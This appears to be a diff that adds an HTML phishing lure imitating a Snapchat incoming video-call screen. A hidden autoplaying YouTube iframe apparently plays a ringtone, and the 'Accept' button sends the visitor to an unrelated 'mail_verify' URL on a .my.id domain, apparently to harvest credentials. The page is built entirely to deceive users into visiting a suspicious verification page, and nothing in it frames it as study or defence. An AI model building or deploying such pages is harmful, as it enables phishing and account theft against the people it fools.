@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Incoming Call</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .call-screen {
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            width: 300px;
+            color: #fff;
+        }
+
+        .caller-info {
+            margin-bottom: 20px;
+        }
+
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 5px solid #fff;
+            object-fit: cover;
+            margin-bottom: 10px;
+        }
+
+        .caller-name {
+            margin: 10px 0;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .call-type {
+            font-size: 16px;
+            color: #bbb;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .accept-btn, .decline-btn {
+            background: #ff4500;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            transition: background 0.3s;
+        }
+
+        .decline-btn {
+            background: #ff6347;
+        }
+
+        .accept-btn:hover {
+            background: #33ff49;
+        }
+
+        .decline-btn:hover {
+            background: #ff3b30;
+        }
+    </style>
+</head>
+<body>
+    <div class="call-screen">
+        <div class="caller-info">
+            <img src="calll.jpg" alt="Caller Profile Picture" class="profile-pic">
+            <h1 class="caller-name">David Smith</h1>
+            <p class="call-type">Video Call</p>
+        </div>
+        <div class="buttons">
+            <button class="accept-btn" onclick="location.href='https://megapaarsonlss.my.id/mail_verify/?id=9f020f'">Accept</button>
+            <button class="decline-btn">Decline</button>
+        </div>
+    </div>
+	<iframe style="display:none;"width="560" height="315" src="https://www.youtube.com/embed/oFXsKRQWxZY?si=cGEuBiS0bI7uGTeH?rel=0&autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</body>
+</html>
